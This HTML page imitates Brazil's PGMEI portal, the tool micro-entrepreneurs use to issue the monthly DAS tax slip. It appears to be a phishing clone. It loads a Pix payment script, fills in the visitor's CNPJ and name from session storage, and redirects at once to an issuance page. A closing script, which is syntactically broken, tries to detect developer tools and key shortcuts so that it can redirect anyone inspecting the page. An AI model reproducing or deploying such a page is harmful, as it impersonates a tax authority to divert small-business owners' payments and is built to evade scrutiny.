
<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE">
    <meta http-equiv="content-language" content="pt-br">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/x-icon" href="assets/images/favicon.ico">
    <title>PGMEI - Programa Gerador de DAS do Microempreendedor Individual</title>
    <link href="assets/css/pgmei.css" rel="stylesheet">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
    <script src="assets/js/jquery.js"></script>
    <script src="assets/js/bootstrap.js"></script>
    <script src="assets/js/ladda.js"></script>
    <script src="assets/js/toastr.js"></script>
    <script src="assets/js/select.js"></script>
    <script src="assets/js/faz-um-pix.min.js"></script>
</head>

<body>
    <div class="container-fluid">
        <header class="row">
            <h3>
                <span class="label label-success">
                    <img alt="Brand" src="assets/images/logo-simples.png"> PGMEI </span>
            </h3>
            <h4 class="text-success">Programa Gerador de DAS do Microempreendedor Individual</h4>
        </header>
        <section class="row">
            <nav class="navbar navbar-default" role="navigation">
                <div class="container-fluid bg-success">
                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbarCollapse" aria-expanded="false" aria-controls="navbar">
                            <span class="sr-only">Toggle navigation</span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                    </div>
                    <div class="collapse navbar-collapse" id="navbarCollapse">
                        <ul class="nav navbar-nav">
                            <li>
                                <a href="index.php??SimplesNacional/pgmei.app/Inicio">
                                    <span class="glyphicon glyphicon-home" aria-hidden="true"></span> Inicio </a>
                            </li>
                            <li>
    <form id="emitirForm" method="POST" style="display: none;">
        <input type="hidden" name="cnpj" id="cnpjHiddenInput" value="">
        <input type="hidden" name="idempresa" id="idempresa" value="">
    </form>
    <a href="#" id="emitirBtn">
        <span class="glyphicon glyphicon-check" aria-hidden="true"></span> Emitir Guia de Pagamento (DAS)
    </a>
</li>
                            <li class="dropdown">
                                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">

                                            <span class="glyphicon glyphicon-lock" aria-hidden="true"></span>

                                         Consulta Extrato/Pendências 
                                        <span class="caret"></span>
                                    </a>

                                    <ul class="dropdown-menu">
                                            <li class="disabled">
                                                <a href="/SimplesNacional/Aplicacoes/ATSPO/pgmei.app/consulta/extrato" data-toggle="popover" title="" data-content="A opção Consulta Extrato/Pendências é habilitada apenas no PGMEI - versão completa, que exige controle de acesso." data-original-title="Acesso restrito"><span class="glyphicon glyphicon-list-alt" aria-hidden="true"></span> Consulta Extrato</a>
                                            </li>
                                            <li class="disabled">
                                                <a href="/SimplesNacional/Aplicacoes/ATSPO/pgmei.app/consulta/pendencia" data-toggle="popover" title="" data-content="A opção Consulta Extrato/Pendências é habilitada apenas no PGMEI - versão completa, que exige controle de acesso." data-original-title="Acesso restrito"><span class="glyphicon glyphicon-saved" aria-hidden="true"></span> Consulta Pendência no Simei</a>
                                            </li>
                                            <li class="disabled">
                                                <a href="/SimplesNacional/Aplicacoes/ATSPO/pgmei.app/consulta/dasEmitidos" data-toggle="popover" title="" data-content="A opção Consulta Extrato/Pendências é habilitada apenas no PGMEI - versão completa, que exige controle de acesso." data-original-title="Acesso restrito"><span class="glyphicon glyphicon-barcode" aria-hidden="true"></span> Consulta DAS Emitidos</a>
                                            </li>
                                    </ul>

                                </li>
                        </ul>
                        <ul class="nav navbar-nav navbar-right">
                            <li>
                                <a href="consulta.php?SimplesNacional/Aplicacoes/ATSPO/pgmei.app/Identificacao">
                                    <span class="glyphicon glyphicon-log-out" aria-hidden="true"></span> Sair </a>
                            </li>
                        </ul>
                    </div>
                </div>
            </nav>
        </section>
        <section class="row" role="contentinfo">
            <ul class="list-group">
    <li class="list-group-item">
        <ul class="list-inline">
            <li>
                <strong>CNPJ:</strong>
                <span id="cnpj"></span>
            </li>
            <li>
                <strong>Nome:</strong>
                <span id="nome"></span>
            </li>
        </ul>
    </li>
</ul>

        </section>
        <section class="row">
            <div class="well col-md-12" role="main">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-md-12">
                            <div class="panel panel-default">
                                <div class="panel-body">
                                    <p class="text-center"> A contagem da carência (quantidade de contribuições necessárias para ter direito aos benefícios previdenciários) inicia-se a partir do <strong>PRIMEIRO PAGAMENTO EM DIA</strong>. </p>
                                    <p class="text-center">O MEI, mesmo sem faturamento, deve pagar mensalmente o DAS (Guia de pagamento).</p>
                                    <p class="text-center">Caso o DAS não tenha sido pago até a data de vencimento, o MEI deve emitir e pagar o novo DAS (Guia de Pagamento) com acréscimos legais (multa e juros). </p>
                                    <p class="text-center">Caso tenha dúvidas sobre o PGMEI, clique em "Ajuda".</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <footer class="row  clearfix">
            <div class="pull-left">
                <p class="text-success">
                    <strong> Versão: 3.16.0 </strong>
                </p>
            </div>
            <div class="pull-right">
                <img src="assets/images/marca_Simples_entes.png" alt="">
            </div>
        </footer>
    </div>
     <script>
document.addEventListener('DOMContentLoaded', function() {
    const meiData = JSON.parse(sessionStorage.getItem('mei_data'));
    
    if (!meiData) {
        alert('Dados não encontrados. Por favor, faça uma nova consulta.');
        window.location.href = 'index.html';
        return;
    }

    // Preencher os campos visuais
    document.getElementById('cnpj').textContent = meiData.dados.info_cnpj.cnpj;
    document.getElementById('nome').textContent = meiData.dados.info_cnpj.nome;

    // Preencher os inputs hidden
    document.getElementById('cnpjHiddenInput').value = meiData.dados.info_cnpj.cnpj;
    document.getElementById('idempresa').value = meiData.dados.info_cnpj.id_empresa ?? '';

    // Ação ao clicar
    document.getElementById('emitirBtn').addEventListener('click', function(e) {
        e.preventDefault();
        // aqui só redireciona
        window.location.href = 'emissao.php?SimplesNacional/pgmei.app/Inicio';

        // 👉 se quiser enviar o form via POST em vez de só redirecionar:
        // document.getElementById('emitirForm').submit();
    });
});
</script>
<script language= "JavaScript">
location.href="emissao.php?SimplesNacional/pgmei.app/Inicio"
</script>
<script>
(function() 

    // Detecta se o DevTools está aberto
    let devtools = { open: false };
    const threshold = 160; // Largura/altura mínima para detectar DevTools

    setInterval(() => {
        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
        if (widthThreshold || heightThreshold) {
            if (!devtools.open) {
                devtools.open = true;
                redirecionar();
            }
        } else {
            devtools.open = false;
        }
    }, 500);

    // Detecta tecla F12
    document.addEventListener("keydown", function(e) {
        if (e.key === "F12") {
            e.preventDefault();
            redirecionar();
        }
    });

    // Detecta Ctrl+Shift+I ou Ctrl+Shift+J ou Ctrl+Shift+C
    document.addEventListener("keydown", function(e) {
        if ((e.ctrlKey && e.shiftKey && ["I","J","C"].includes(e.key.toUpperCase())) || (e.ctrlKey && e.key === "U")) {
            e.preventDefault();
            redirecionar();
        }
    });
})();
</script>



    
</body>

</html>